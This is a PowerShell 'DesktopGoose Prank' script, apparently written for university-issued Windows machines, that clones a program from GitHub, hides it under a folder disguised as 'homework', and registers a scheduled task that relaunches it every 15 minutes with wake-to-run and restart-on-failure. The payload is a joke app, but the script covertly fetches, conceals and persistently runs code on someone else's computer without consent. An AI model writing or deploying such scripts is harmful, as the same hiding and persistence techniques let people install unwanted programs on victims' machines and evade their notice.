#This is the DesktopGoose Prank
#-------------------------------
#Description:
# - This script downloads desktop goose, hides it at the root level, and creates a scheduled task that starts it at 9am and repeats 
# execution every 15 minutes with a few other settings
#Requirements:
# - Can be downloaded from github with - git clone https://github.com/Gorty33/gooseprank.git
# - Needs to be run in powershell with administrative privileges
#Known Flaws:
# - Cannot be run on computers that are not DSU Issued - Can fix by editing the paths and the place where the files are stored
# - Cannot be run on computers that do not have git installed

#Downloads Desktop Goose
cd "C:\"
git clone https://github.com/Gorty33/goose.git
Rename-Item -Path "C:\goose" -NewName "homework"
Set-ItemProperty -Path "C:\homework" -Name "Attributes" -Value ([System.IO.FileAttributes]::Hidden)

#Creates Scheduled task
# Define variables
$taskName = "lol"
$actionExe = "C:\homework\Desktop Goose v0.31\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"
$trigger = New-ScheduledTaskTrigger -Once -At "9:00 AM" -RepetitionInterval (New-TimeSpan -Minutes 15) -RepetitionDuration ([TimeSpan]::MaxValue)
$userName = "DSU"

# Define task settings
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

# Set action with timeout argument
$action = New-ScheduledTaskAction -Execute "$actionExe" -Argument "-Timeout 7200"  # 7200 seconds = 2 hours

# Create XML for task definition
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2024-04-03T11:02:48.8508311</Date>
    <Author>DSU</Author>
    <URI>\lol</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-4103267842-3278845275-3657546061-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>P1D</ExecutionTimeLimit>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <RestartOnFailure>
      <Count>3</Count>
      <Interval>PT1M</Interval>
    </RestartOnFailure>
    <StartWhenAvailable>true</StartWhenAvailable>
    <WakeToRun>true</WakeToRun>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
  </Settings>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2024-04-03T09:00:03</StartBoundary>
      <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
      <Repetition>
        <Interval>PT15M</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>true</StopAtDurationEnd>
      </Repetition>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>"C:\Users\DSU\Downloads\Desktop Goose v0.31\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"</Command>
    </Exec>
  </Actions>
</Task>
"@

# Register scheduled task with settings
Register-ScheduledTask -Xml $taskXml -TaskName $taskName
